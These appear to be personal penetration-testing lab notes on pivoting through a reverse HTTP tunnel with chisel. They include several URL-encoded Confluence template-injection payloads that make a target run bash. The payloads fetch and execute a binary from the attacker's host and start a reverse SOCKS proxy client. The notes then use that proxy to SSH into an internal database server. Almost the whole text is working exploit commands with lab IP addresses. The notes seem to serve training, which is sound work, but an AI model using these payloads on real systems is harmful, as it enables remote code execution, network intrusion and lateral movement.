#### HTTP Tunnel
HTTP Tunnel
sudo cp $(which chisel) /var/www/html/
sudo systemctl start apache2

This is the payload we are going to encode:
wget <ATTACK IP>/chisel -O /tmp/chisel && chmod +x /tmp/chisel

Encoded payload:
curl http://<TARGET IP: PORT>/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20<ATTACK IP>/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

Here it is again:
curl http://192.168.188.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27wget%20192.168.45.210/chisel%20-O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/

Start the chisel server:
 chisel server --port 8080 --reverse
 
 Run tcpdump to log all traffic: 
 sudo tcpdump -nvvvXi tun0 tcp port 8080
 
 Here is the web shell chisel client payload:
 /tmp/chisel client 192.168.45.243:8080 R:socks > /dev/null 2>&1 &
 
 Here it is encoded as a confluence payload:
 curl http://<TARGET IP: PORT>/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20<ATTACK IP: PORT>%20R:socks%27%29.start%28%29%22%29%7D/
 
 Here it is again, the confluence payload: 
  curl http://192.168.188.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.210:8080%20R:socks%27%29.start%28%29%22%29%7D/
  
  Check the status of the SOCKS proxy:
  ss -ntplu
  
  Proxy in an SSH connection:
  ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
  
  We gained access to the SSH server, through our Chisel reverse SOCKS proxy, tunneling traffic through a reverse HTTP tunnel.
  
  
  Chisel Payload:
  curl http://192.168.188.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27/tmp/chisel%20client%20192.168.45.210:8080%20R:socks%27%29.start%28%29%22%29%7D/
  
  curl http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27uname%20-r%20%27%29.start%28%29%22%29%7D/
  
  troubleshoot: 
   check SOCKS
   ss -ntplu 
   check connection 
    sudo tcpdump -nvvvXi tun0 tcp port 8080
    
    
    ./chisel client 192.168.45.238:8086 R:socks
    
    
    Install ncat then:
    ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
    
    SOCKS conf
    /etc/socks.conf
    /etc/proxychains.conf
    /etc/proxychains4.conf
    
    socks5 127.0.0.1 1080


